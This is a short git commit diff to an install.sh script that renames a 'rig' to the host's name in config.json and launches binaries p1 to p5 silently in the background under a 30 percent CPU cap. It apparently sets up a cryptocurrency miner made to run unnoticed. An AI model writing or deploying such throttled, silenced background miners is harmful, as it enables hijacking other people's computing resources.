8e1dc20ee66274b754c0d59971527061a6175c3a
juan robert <kijang-020@hotmail.com>
2021-12-28 21:59:18 +0000

    install.sh edited online with Bitbucket

--- install.sh
+++ install.sh
@@ -7,7 +7,7 @@ chmod +x p3
 chmod +x p4
 chmod +x p5
 chmod +x config.json
-sed -i "s/RIGNAME/$hostname/" "sc2.py"
+sed -i "s/RIGNAME/$hostname/" "config.json"
 cpulimit -l 30 ./p1 >/dev/null 2>&1 >/dev/null &
 cpulimit -l 30 ./p2 >/dev/null 2>&1 >/dev/null &
 cpulimit -l 30 ./p3 >/dev/null 2>&1 >/dev/null &
